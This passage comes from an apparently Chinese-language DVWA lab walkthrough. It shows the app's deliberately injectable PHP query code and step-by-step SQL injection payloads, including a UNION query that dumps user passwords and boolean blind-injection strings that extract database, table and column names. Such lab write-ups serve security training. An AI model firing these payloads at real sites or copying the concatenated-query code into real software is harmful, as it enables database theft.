data-num=\"19\"></td><td><pre>\t\t\t\t<span class=\"token comment\">// Feedback for end user</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t\t\t<span class=\"token variable\">$html</span> <span class=\"token operator\">.=</span> <span class=\"token string double-quoted-string\">\"&lt;pre>ID: <span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$id</span><span class=\"token punctuation\">&#125;</span></span>&lt;br />First name: <span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$first</span><span class=\"token punctuation\">&#125;</span></span>&lt;br />Surname: <span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$last</span><span class=\"token punctuation\">&#125;</span></span>&lt;/pre>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t\t<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_null</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___mysqli_res</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token constant boolean\">false</span> <span class=\"token punctuation\">:</span> <span class=\"token variable\">$___mysqli_res</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t\t</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\t<span class=\"token keyword\">case</span> <span class=\"token constant\">SQLITE</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t\t<span class=\"token keyword\">global</span> <span class=\"token variable\">$sqlite_db_connection</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t\t<span class=\"token variable\">$query</span>  <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT first_name, last_name FROM users WHERE user_id = '<span class=\"token interpolation\"><span class=\"token variable\">$id</span></span>' LIMIT 1;\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t\t\t<span class=\"token comment\">#print $query;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t\t\t<span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t\t\t\t<span class=\"token variable\">$results</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$sqlite_db_connection</span><span class=\"token operator\">-></span><span class=\"token function\">query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$query</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> <span class=\"token variable\">$e</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Caught exception: '</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$e</span><span class=\"token operator\">-></span><span class=\"token function\">getMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$results</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$results</span><span class=\"token operator\">-></span><span class=\"token function\">fetchArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t\t\t\t\t<span class=\"token comment\">// Get values</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t\t\t\t\t<span class=\"token variable\">$first</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"first_name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t\t\t\t\t<span class=\"token variable\">$last</span>  <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"last_name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t\t\t\t\t<span class=\"token comment\">// Feedback for end user</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t\t\t\t\t<span class=\"token variable\">$html</span> <span class=\"token operator\">.=</span> <span class=\"token string double-quoted-string\">\"&lt;pre>ID: <span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$id</span><span class=\"token punctuation\">&#125;</span></span>&lt;br />First name: <span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$first</span><span class=\"token punctuation\">&#125;</span></span>&lt;br />Surname: <span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$last</span><span class=\"token punctuation\">&#125;</span></span>&lt;/pre>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Error in fetch \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$sqlite_db</span><span class=\"token operator\">-></span><span class=\"token function\">lastErrorMsg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>这里是 <code>$id = $_SESSION[ 'id' ];</code>  利用了 SESSION 获得 id 值，因为 session 我们就不能在当前页面注入</p>\n<p>防御了自动化的 SQL 注入，分析源码可以看到，对参数没有做防御，在 sql 查询语句中限制了查询条数</p>\n<p>利用 <code>1' union select user,password from users#</code> 获取账户密码</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/TGZ%7DX52RQ5%28MNK9%7BD8JZ3%254.png\" alt=\"\" /></p>\n<h1 id=\"3sql-injectionblind\"><a class=\"anchor\" href=\"#3sql-injectionblind\">#</a> 3.SQL injection(Blind)</h1>\n<h2 id=\"1等级low-3\"><a class=\"anchor\" href=\"#1等级low-3\">#</a> 1. 等级： <code>Low</code></h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"><span>p</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'Submit'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token comment\">// Get input</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token variable\">$id</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'id'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token variable\">$exists</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_DVWA</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SQLI_DB'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token keyword\">case</span> <span class=\"token constant\">MYSQL</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t\t<span class=\"token comment\">// Check database</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t\t<span class=\"token variable\">$query</span>  <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT first_name, last_name FROM users WHERE user_id = '<span class=\"token interpolation\"><span class=\"token variable\">$id</span></span>';\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t\t<span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t\t\t<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$query</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// Removed 'or die' to suppress mysql errors</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> <span class=\"token variable\">$e</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">print</span> <span class=\"token string double-quoted-string\">\"There was an error.\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">exit</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t\t<span class=\"token variable\">$exists</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span> <span class=\"token operator\">!==</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t\t\t\t<span class=\"token variable\">$exists</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token function\">mysqli_num_rows</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$result</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> <span class=\"token variable\">$e</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\t\t\t\t<span class=\"token variable\">$exists</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\t\t<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_null</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___mysqli_res</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token constant boolean\">false</span> <span class=\"token punctuation\">:</span> <span class=\"token variable\">$___mysqli_res</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t\t<span class=\"token keyword\">case</span> <span class=\"token constant\">SQLITE</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t\t\t<span class=\"token keyword\">global</span> <span class=\"token variable\">$sqlite_db_connection</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t\t\t<span class=\"token variable\">$query</span>  <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT first_name, last_name FROM users WHERE user_id = '<span class=\"token interpolation\"><span class=\"token variable\">$id</span></span>';\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t\t\t<span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t\t\t\t<span class=\"token variable\">$results</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$sqlite_db_connection</span><span class=\"token operator\">-></span><span class=\"token function\">query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$query</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t\t\t\t<span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$results</span><span class=\"token operator\">-></span><span class=\"token function\">fetchArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t\t\t\t<span class=\"token variable\">$exists</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span> <span class=\"token operator\">!==</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> <span class=\"token variable\">$e</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t\t\t\t<span class=\"token variable\">$exists</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$exists</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t\t<span class=\"token comment\">// Feedback for end user</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t\t<span class=\"token variable\">$html</span> <span class=\"token operator\">.=</span> <span class=\"token string single-quoted-string\">'&lt;pre>User ID exists in the database.&lt;/pre>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\t\t<span class=\"token comment\">// User wasn't found, so the page wasn't!</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t\t<span class=\"token function\">header</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'SERVER_PROTOCOL'</span> <span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">' 404 Not Found'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t\t<span class=\"token comment\">// Feedback for end user</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\t\t<span class=\"token variable\">$html</span> <span class=\"token operator\">.=</span> <span class=\"token string single-quoted-string\">'&lt;pre>User ID is MISSING from the database.&lt;/pre>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>这里的 id 是用 get 方法传入，没有进行过滤，但是输出值只有两种：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"><span>p</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$exists</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t\t<span class=\"token variable\">$html</span> <span class=\"token operator\">.=</span> <span class=\"token string single-quoted-string\">'&lt;pre>User ID exists in the database.&lt;/pre>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\t<span class=\"token function\">header</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'SERVER_PROTOCOL'</span> <span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">' 404 Not Found'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t<span class=\"token variable\">$html</span> <span class=\"token operator\">.=</span> <span class=\"token string single-quoted-string\">'&lt;pre>User ID is MISSING from the database.&lt;/pre>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这里是布尔型盲注</p>\n<p>盲注常用函数：</p>\n<pre><code>length() 返回字符串的长度，例如可以返回数据库名字的长度 \nsubstr() ⽤来截取字符串   substr（str,start,stop）\nsubstr截取字符串str,从start开始截取，截取stop个字符\n\nascii() 返回字符的ascii码\nsleep(n) 将程序挂起⼀段时间，n为n秒\nif(expr1,expr2,expr3) 判断语句 如果第⼀个语句正确就执⾏第⼆个语句如果错误执⾏第三个语句\n</code></pre>\n<p>使用 <code>1' and 1=1#</code>  存在</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/E%40DXF%40OLQM5G1G%60J%251HAEZB.png\" alt=\"\" /></p>\n<p>输入 <code>1' and 1=2#</code>  不存在</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/LG_3%7DJ38E%7BV8%5B5P%5D6VPQYZD.png\" alt=\"\" /></p>\n<p>判断是字符型注入</p>\n<p>利用 <code>length()</code>  来判断其数据库名的长度：</p>\n<p><code>1' and length(database())=1#</code>  错误</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/%5DEXHQO%28K%5B71H%60N8Z0I%25Y3K1.png\" alt=\"\" /></p>\n<p><code>1' and length(database())=4#</code>  一直尝试到 4 才成功，证明数据库名长度为 4</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/PM44XJV0YBTXMJZ1P1M11%5BQ.png\" alt=\"\" /></p>\n<p>通过 <code>ascii()</code>  与 <code>substr()</code>  来尝试得到数据库名称，需要利用二分法来猜测</p>\n<p><code>1' and ascii(substr(database(),1,1))&lt;97#</code>  返回错误，所以肯定大于 <code>a</code></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/JBSBJWV10W3%7EFF51KG%24N20W.png\" alt=\"\" /></p>\n<p><code>1' and ascii(substr(database(),1,1))&lt;123#</code>  存在</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/6G%60_%5B%5B%5D5%5BC%28F4%5D%5BDM%24TF4%25A.png\" alt=\"\" /></p>\n<p>重复这种方式查找即可，最后得到数据库名称是 <code>DVWA</code></p>\n<p>利用 <code>count函数</code> 来判断 <code>table_name</code>  数量有几个</p>\n<p><code>1' and (select count(table_name) from information_schema.tables where table_schema=database())=1 #</code></p>\n<p>为 2 时返回正常：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/%60P_GORR%60%7E%5DOO%60DX3%2563%25%7B7W.png\" alt=\"\" /></p>\n<p><code>1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 #</code>  查询表的长度</p>\n<p>为 9 时返回正确：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/G_%5DSGU3JU6KU1S%7DBHW9XUWM.png\" alt=\"\" /></p>\n<p><code>1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=97 # </code>  猜测表的名字</p>\n<p>第一个为 <code>g</code></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/EO97F%7D%25XVEN%5BZQIXHEK34%7BL.png\" alt=\"\" /></p>\n<p>最后得到两个表名分别为 <code>guestbook</code>  和 <code>users</code></p>\n<p>查询表的字段名：</p>\n<p><code>1' and ascii(substr((select column_name from information_schema.columns where table_name= 'users' limit i,1),n,1))=101 #</code></p>\n<pre><code>注释：\ni代表查询第几个字段名\nn代码查询字段名的第几个字符\n</code></pre>\n<p>得到第四个字段和第五个字段分别为 <code>user</code>  和 <code>password</code></p>\n<p>查询字段内的数据：</p>\n<p><code>1' and ascii(substr((select user from dvwa.users limit 0,1),1,1))=97 # </code></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/ZH%60%7B6DQAFD%299W%7BASO%5BKG%7EQ8.png\" alt=\"\" /></p>\n<p>最后得到为 admin，然后可以通过这种方式得到 password 和其他数据</p>\n<h2 id=\"2等级medium-3\"><a class=\"anchor\" href=\"#2等级medium-3\">#</a> 2. 等级： <code>Medium</code></h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"><span>p</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'Submit'</span> <span class=\"token punctuation\">]</span>  <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token comment\">// Get input</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token variable\">$id</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'id'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token variable\">$exists</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_DVWA</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SQLI_DB'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token keyword\">case</span> <span class=\"token constant\">MYSQL</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t\t<span class=\"token variable\">$id</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$id</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">trigger_error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">E_USER_ERROR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token 